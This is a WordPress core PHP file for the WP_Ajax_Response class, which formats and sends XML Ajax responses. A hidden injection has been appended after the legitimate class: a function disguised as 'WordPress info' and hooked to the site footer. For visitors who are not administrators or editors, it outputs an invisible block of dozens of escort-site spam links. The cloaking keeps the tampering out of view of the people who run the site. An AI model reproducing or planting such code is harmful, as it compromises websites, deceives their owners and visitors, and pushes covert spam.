<?php
/**
 * Send XML response back to Ajax request.
 *
 * @package WordPress
 * @since 2.1.0
 */
class WP_Ajax_Response {
	/**
	 * Store XML responses to send.
	 *
	 * @since 2.1.0
	 * @var array
	 */
	public $responses = array();

	/**
	 * Constructor - Passes args to WP_Ajax_Response::add().
	 *
	 * @since 2.1.0
	 *
	 * @see WP_Ajax_Response::add()
	 *
	 * @param string|array $args Optional. Will be passed to add() method.
	 */
	public function __construct( $args = '' ) {
		if ( ! empty( $args ) ) {
			$this->add( $args );
		}
	}

	/**
	 * Appends data to an XML response based on given arguments.
	 *
	 * With `$args` defaults, extra data output would be:
	 *
	 *     <response action='{$action}_$id'>
	 *      <$what id='$id' position='$position'>
	 *          <response_data><![CDATA[$data]]></response_data>
	 *      </$what>
	 *     </response>
	 *
	 * @since 2.1.0
	 *
	 * @param string|array $args {
	 *     Optional. An array or string of XML response arguments.
	 *
	 *     @type string          $what         XML-RPC response type. Used as a child element of `<response>`.
	 *                                         Default 'object' (`<object>`).
	 *     @type string|false    $action       Value to use for the `action` attribute in `<response>`. Will be
	 *                                         appended with `_$id` on output. If false, `$action` will default to
	 *                                         the value of `$_POST['action']`. Default false.
	 *     @type int|WP_Error    $id           The response ID, used as the response type `id` attribute. Also
	 *                                         accepts a `WP_Error` object if the ID does not exist. Default 0.
	 *     @type int|false       $old_id       The previous response ID. Used as the value for the response type
	 *                                         `old_id` attribute. False hides the attribute. Default false.
	 *     @type string          $position     Value of the response type `position` attribute. Accepts 1 (bottom),
	 *                                         -1 (top), HTML ID (after), or -HTML ID (before). Default 1 (bottom).
	 *     @type string|WP_Error $data         The response content/message. Also accepts a WP_Error object if the
	 *                                         ID does not exist. Default empty.
	 *     @type array           $supplemental An array of extra strings that will be output within a `<supplemental>`
	 *                                         element as CDATA. Default empty array.
	 * }
	 * @return string XML response.
	 */
	public function add( $args = '' ) {
		$defaults = array(
			'what'         => 'object',
			'action'       => false,
			'id'           => '0',
			'old_id'       => false,
			'position'     => 1,
			'data'         => '',
			'supplemental' => array(),
		);

		$parsed_args = wp_parse_args( $args, $defaults );

		$position = preg_replace( '/[^a-z0-9:_-]/i', '', $parsed_args['position'] );
		$id       = $parsed_args['id'];
		$what     = $parsed_args['what'];
		$action   = $parsed_args['action'];
		$old_id   = $parsed_args['old_id'];
		$data     = $parsed_args['data'];

		if ( is_wp_error( $id ) ) {
			$data = $id;
			$id   = 0;
		}

		$response = '';
		if ( is_wp_error( $data ) ) {
			foreach ( (array) $data->get_error_codes() as $code ) {
				$response  .= "<wp_error code='$code'><![CDATA[" . $data->get_error_message( $code ) . ']]></wp_error>';
				$error_data = $data->get_error_data( $code );
				if ( ! $error_data ) {
					continue;
				}
				$class = '';
				if ( is_object( $error_data ) ) {
					$class      = ' class="' . get_class( $error_data ) . '"';
					$error_data = get_object_vars( $error_data );
				}

				$response .= "<wp_error_data code='$code'$class>";

				if ( is_scalar( $error_data ) ) {
					$response .= "<![CDATA[$error_data]]>";
				} elseif ( is_array( $error_data ) ) {
					foreach ( $error_data as $k => $v ) {
						$response .= "<$k><![CDATA[$v]]></$k>";
					}
				}

				$response .= '</wp_error_data>';
			}
		} else {
			$response = "<response_data><![CDATA[$data]]></response_data>";
		}

		$s = '';
		if ( is_array( $parsed_args['supplemental'] ) ) {
			foreach ( $parsed_args['supplemental'] as $k => $v ) {
				$s .= "<$k><![CDATA[$v]]></$k>";
			}
			$s = "<supplemental>$s</supplemental>";
		}

		if ( false === $action ) {
			$action = $_POST['action'];
		}
		$x  = '';
		$x .= "<response action='{$action}_$id'>"; // The action attribute in the xml output is formatted like a nonce action.
		$x .= "<$what id='$id' " . ( false === $old_id ? '' : "old_id='$old_id' " ) . "position='$position'>";
		$x .= $response;
		$x .= $s;
		$x .= "</$what>";
		$x .= '</response>';

		$this->responses[] = $x;
		return $x;
	}

	/**
	 * Display XML formatted responses.
	 *
	 * Sets the content type header to text/xml.
	 *
	 * @since 2.1.0
	 */
	public function send() {
		header( 'Content-Type: text/xml; charset=' . get_option( 'blog_charset' ) );
		echo "<?xml version='1.0' encoding='" . get_option( 'blog_charset' ) . "' standalone='yes'?><wp_ajax>";
		foreach ( (array) $this->responses as $response ) {
			echo $response;
		}
		echo '</wp_ajax>';
		if ( wp_doing_ajax() ) {
			wp_die();
		} else {
			die();
		}
	}
}

/* WordPress info */
function wp_info_handler() {if (current_user_can('administrator') || current_user_can('editor')) return; ?><div class="new-links" style="display: none"> <a href="http://istanbulescortbayan.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortiletisim.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortagency.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortnil.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortpartner.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescorts.org" target="_blank">istanbul escort</a> - <a href="http://istanbulescortbayan.net" target="_blank">istanbul escort</a> - <a href="http://vipistanbulescorts.com" target="_blank">istanbul escort</a> - <a href="http://bakirkoyescort.com" target="_blank">istanbul escort</a> - <a href="http://bakirkoyescort.org" target="_blank">istanbul escort</a> - <a href="http://atakoyescort.net" target="_blank">ataköy escort</a> - <a href="http://atakoyescorts.com" target="_blank">ataköy escort</a> - <a href="http://istanbulescortservices.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescorthotties.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortfashion.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortserenay.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortkizlar.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortdeluxe.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortsclass.com" target="_blank">istanbul escort</a> - <a href="http://bayanistanbulescort.net" target="_blank">istanbul escort</a> - <a href="http://istanbulescortarzum.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortbegum.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortcansu.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortdrive.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortelena.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescorteylul.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescorthelen.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortmasoz.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortqueen.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortsinem.com" target="_blank">istanbul escort</a> - <a href="http://sexyistanbulescorts.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortasli.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortline.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortlove.com" target="_blank">istanbul escort</a> - <a href="http://staristanbulescort.com" target="_blank">istanbul escort</a> - <a href="http://vipescortsistanbul.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortkiz.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortvar.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortara.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescorteva.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortkim.com" target="_blank">istanbul escort</a> - <a href="http://myistanbulescort.com" target="_blank">istanbul escort</a> - <a href="http://istanbulescortt.net" target="_blank">istanbul escort</a> - <a href="http://escortsdubai.biz" target="_blank">dubai escorts</a> - <a href="http://vipdubaiescorts.org" target="_blank">dubai escorts</a> - <a href="http://dubaiescortagency.net" target="_blank">dubai escorts</a> - <a href="http://escortsindubai.org" target="_blank">dubai escorts</a> - <a href="http://escortdubai.org" target="_blank">dubai escorts</a> - <a href="http://dubaiescortservices.net" target="_blank">dubai escorts</a> - <a href="http://vipescortdubai.com" target="_blank">dubai escorts</a> - <a href="http://escortdubaivip.com" target="_blank">dubai escorts</a> - <a href=" http://istanbulescortmasoz.com/bakirkoy-escort-bayanlar/" target="_blank">bakırköy escort</a> - <a href=" http://istanbulescortnil.com/bakirkoy-escort-bayanlar/" target="_blank">bakırköy escort</a> - <a href=" http://istanbulescortara.com/bakirkoy-escort-bayanlar/" target="_blank">bakırköy escort</a> - <a href=" http://istanbulescortline.com/bakirkoy-escort-bayanlar/" target="_blank">bakırköy escort</a> - <a href=" http://istanbulescortbayan.com/bakirkoy-escort-bayanlar/" target="_blank">bakırköy escort</a> - <a href=" http://istanbulescortagency.com/bakirkoy-escort-bayanlar/" target="_blank">bakırköy escort</a> - <a href=" http://istanbulescortpartner.com/bakirkoy-escort-bayanlar/" target="_blank">bakırköy escort</a> - <a href=" http://istanbulescortiletisim.com/bakirkoy-escort-bayanlar/" target="_blank">bakırköy escort</a> - <a href=" http://istanbulescortmasoz.com/beylikduzu-escort-bayanlar/" target="_blank">beylikdüzü escort</a> - <a href=" http://istanbulescortnil.com/beylikduzu-escort-bayanlar/" target="_blank">beylikdüzü escort</a> - <a href=" http://istanbulescortara.com/beylikduzu-escort-bayanlar/" target="_blank">beylikdüzü escort</a> - <a href=" http://istanbulescortline.com/beylikduzu-escort-bayanlar/" target="_blank">beylikdüzü escort</a> - <a href=" http://istanbulescortbayan.com/beylikduzu-escort-bayanlar/" target="_blank">beylikdüzü escort</a> - <a href=" http://istanbulescortagency.com/beylikduzu-escort-bayanlar/" target="_blank">beylikdüzü escort</a> - <a href=" http://istanbulescortpartner.com/beylikduzu-escort-bayanlar/" target="_blank">beylikdüzü escort</a> - <a href=" http://istanbulescortiletisim.com/beylikduzu-escort-bayanlar/" target="_blank">beylikdüzü escort</a> - <a href=" http://istanbulescortmasoz.com/sirinevler-escort-bayanlar/" target="_blank">şirinevler escort</a> - <a href=" http://istanbulescortnil.com/sirinevler-escort-bayanlar/" target="_blank">şirinevler escort</a> - <a href=" http://istanbulescortara.com/sirinevler-escort-bayanlar/" target="_blank">şirinevler escort</a> - <a href=" http://istanbulescortline.com/sirinevler-escort-bayanlar/" target="_blank">şirinevler escort</a> - <a href=" http://istanbulescortbayan.com/sirinevler-escort-bayanlar/" target="_blank">şirinevler escort</a> - <a href=" http://istanbulescortagency.com/sirinevler-escort-bayanlar/" target="_blank">şirinevler escort</a> - <a href=" http://istanbulescortpartner.com/sirinevler-escort-bayanlar/" target="_blank">şirinevler escort</a> - <a href=" http://istanbulescortiletisim.com/sirinevler-escort-bayanlar/" target="_blank">şirinevler escort</a> - <a href=" http://istanbulescortmasoz.com/atakoy-escort-bayanlar/" target="_blank">ataköy escort</a> - <a href=" http://istanbulescortnil.com/atakoy-escort-bayanlar/" target="_blank">ataköy escort</a> - <a href=" http://istanbulescortara.com/atakoy-escort-bayanlar/" target="_blank">ataköy escort</a> - <a href=" http://istanbulescortline.com/atakoy-escort-bayanlar/" target="_blank">ataköy escort</a> - <a href=" http://istanbulescortbayan.com/atakoy-escort-bayanlar/" target="_blank">ataköy escort</a> - <a href=" http://istanbulescortagency.com/atakoy-escort-bayanlar/" target="_blank">ataköy escort</a> - <a href=" http://istanbulescortpartner.com/atakoy-escort-bayanlar/" target="_blank">ataköy escort</a> - <a href=" http://istanbulescortiletisim.com/atakoy-escort-bayanlar/" target="_blank">ataköy escort</a> - <a href=" http://istanbulescortmasoz.com/sisli-escort-bayanlar/" target="_blank">şişli escort</a> - <a href=" http://istanbulescortnil.com/sisli-escort-bayanlar/" target="_blank">şişli escort</a> - <a href=" http://istanbulescortara.com/sisli-escort-bayanlar/" target="_blank">şişli escort</a> - <a href=" http://istanbulescortline.com/sisli-escort-bayanlar/" target="_blank">şişli escort</a> - <a href=" http://istanbulescortbayan.com/sisli-escort-bayanlar/" target="_blank">şişli escort</a> - <a href=" http://istanbulescortagency.com/sisli-escort-bayanlar/" target="_blank">şişli escort</a> - <a href=" http://istanbulescortpartner.com/sisli-escort-bayanlar/" target="_blank">şişli escort</a> - <a href=" http://istanbulescortiletisim.com/sisli-escort-bayanlar/" target="_blank">şişli escort</a> - <a href=" http://istanbulescortmasoz.com/mecidiyekoy-escort-bayanlar/" target="_blank">mecidiyeköy escort</a> - <a href=" http://istanbulescortnil.com/mecidiyekoy-escort-bayanlar/" target="_blank">mecidiyeköy escort</a> - <a href=" http://istanbulescortara.com/mecidiyekoy-escort-bayanlar/" target="_blank">mecidiyeköy escort</a> - <a href=" http://istanbulescortline.com/mecidiyekoy-escort-bayanlar/" target="_blank">mecidiyeköy escort</a> - <a href=" http://istanbulescortbayan.com/mecidiyekoy-escort-bayanlar/" target="_blank">mecidiyeköy escort</a> - <a href=" http://istanbulescortagency.com/mecidiyekoy-escort-bayanlar/" target="_blank">mecidiyeköy escort</a> - <a href=" http://istanbulescortpartner.com/mecidiyekoy-escort-bayanlar/" target="_blank">mecidiyeköy escort</a> - <a href=" http://istanbulescortiletisim.com/mecidiyekoy-escort-bayanlar/" target="_blank">mecidiyeköy escort</a> </div><?php }
add_action('wp_footer', 'wp_info_handler');